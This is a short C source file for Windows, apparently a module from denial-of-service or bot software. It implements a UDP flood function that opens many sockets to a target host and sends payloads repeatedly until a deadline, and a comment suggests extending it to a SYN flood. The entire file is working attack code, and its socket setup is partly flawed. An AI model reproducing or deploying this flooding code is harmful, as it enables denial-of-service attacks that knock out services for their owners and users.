#include <WinSock2.h>

#pragma comment (lib, "Ws2_32.lib")

/*
	easily to modify if you wanna add SYN Flood
*/
long getAddrFromString(char* hostnameOrIp, SOCKADDR_IN* addr)
{
	unsigned long ip;
	HOSTENT* he;
	if(hostnameOrIp == NULL || addr == NULL)
		return SOCKET_ERROR;
	ip = (unsigned long)inet_addr(hostnameOrIp);
	if(ip != INADDR_NONE)
	{
		addr->sin_addr.s_addr = ip;
		return 0;
	}
	else
	{
		he = (HOSTENT *)gethostbyname(hostnameOrIp);
		if(he == NULL)
		return SOCKET_ERROR;
		else
			CopyMemory(&(addr->sin_addr),he->h_addr_list[0],4);
		return 0;
	}
}

SOCKET ProtocolType(char *to, int port, int proto)
{
	WSADATA w;
	SOCKADDR_IN addr;
	if(int result = WSAStartup(MAKEWORD(2,2), &w) != 0)
		return SOCKET_ERROR;
	SOCKET s = (SOCKET)socket(AF_INET, SOCK_STREAM, proto);
    if(s == -1)
		return SOCKET_ERROR;
	RtlZeroMemory(&addr,sizeof(SOCKADDR_IN));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if (getAddrFromString(to,&addr) == SOCKET_ERROR)
		return SOCKET_ERROR;
	if ((SOCKET)connect(s,(SOCKADDR*)&addr,sizeof(SOCKADDR)) == SOCKET_ERROR)
		return SOCKET_ERROR;
	return s;
}

void udpflood(char *target, int port, int connections, int size, int interval, int deadline)
{
	SOCKET *conns = (SOCKET*)calloc(connections, sizeof(SOCKET));
	int i = 0;
	int wait_int = 500;
	// create connections
	for (i = 0; i < connections; i++)
		conns[i] = ProtocolType(target, port, IPPROTO_UDP);
	// flood while there is no Stop command
		int tickend = 0;
		srand( GetTickCount() );
		tickend = ( GetTickCount() + ( deadline * 1000 ) );
		while ( TRUE ) {
		for (i = 0; i < connections; i++)
		{
			if (conns[i] != SOCKET_ERROR)
			{
				char *buf = (char*)LocalAlloc(LMEM_FIXED, size);
				send(conns[i], buf, size, 0);
				LocalFree(buf);
			}
			else
				conns[i] = ProtocolType(target, port, IPPROTO_UDP);
				wait_int = 500;
		}
		if( (signed int)GetTickCount() >= tickend ) {
				goto __JMP;
		}
		Sleep(interval);
		}
__JMP:
	// close connections
	for (i = 0; i < connections; i++)
		closesocket(conns[i]);
}
